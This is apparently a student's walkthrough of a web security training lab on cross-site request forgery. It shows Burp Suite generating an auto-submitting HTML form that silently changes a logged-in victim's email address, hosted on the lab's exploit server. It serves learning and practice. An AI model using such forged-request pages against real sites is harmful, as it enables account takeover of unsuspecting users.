# Lab: CSRF vulnerability with no defenses

 This lab's email change functionality is vulnerable to CSRF.

To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.

You can log in to your own account using the following credentials: wiener:peter 

# Step 1 Walk the application's email change functionality


Fist I login to the web app with the supplied account:

![image](https://user-images.githubusercontent.com/83407557/210661610-d5b3cd2d-246e-4f8e-a449-bff691d31ec2.png)

And Send a request to change my email to burp:

![image](https://user-images.githubusercontent.com/83407557/210661432-fef37f97-4b72-4c04-81ea-bf8869528ffa.png)

![image](https://user-images.githubusercontent.com/83407557/210661677-7d8dc92d-382f-4770-9012-dabf3da8cca1.png)

# Step 2 Craft CSRF POC

I then go into http history and find the POST request that was sent to change my email

![image](https://user-images.githubusercontent.com/83407557/210661900-1db814e9-5fa3-42c4-a079-80f57c50b09c.png)

Right clicking the request I go to engagement tools -> Generate CSRF POC:

![image](https://user-images.githubusercontent.com/83407557/210662190-ba25ab9c-da72-440b-af06-0119ac7a2f2d.png)

Under options I select include-auto-submit script, then click regenerate to add the auto-submit:

![image](https://user-images.githubusercontent.com/83407557/210663595-61cdaac9-a72c-4b9e-bcf4-cb895c9d7924.png)

Making the payload:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0ade00ed0418d005c03fdb41001000b2.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hermh4cks&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```


# Step 3 Add CSRF on my attack-server

I add the payload into the msg body of my /exploit page and click store:

![image](https://user-images.githubusercontent.com/83407557/210663908-a5d40f1b-4601-407f-abe7-84fa8e6f5d5f.png)


# Step 4 test that exploit is working

First I change my email back to something else:

![image](https://user-images.githubusercontent.com/83407557/210664008-a230abec-f3bc-4cf5-b91b-6120b3d302dd.png)

Clicking view exploit:

![image](https://user-images.githubusercontent.com/83407557/210664084-04edad1a-5db7-4436-b5df-206dda3de2fc.png)

I see that it changes my email again:

![image](https://user-images.githubusercontent.com/83407557/210664133-68108c80-a474-40a9-8db3-c4d28ca0d0a0.png)

# Step 4 Send exploit to victem:

![image](https://user-images.githubusercontent.com/83407557/210664201-664f4e9a-7004-4881-8c6d-05ea1425046b.png)

While I cannot see the outcome, as CSRF is one-way, I do see that the lab is solved:

![image](https://user-images.githubusercontent.com/83407557/210664383-ea981df0-6461-447b-8801-c8cdc79b744e.png)



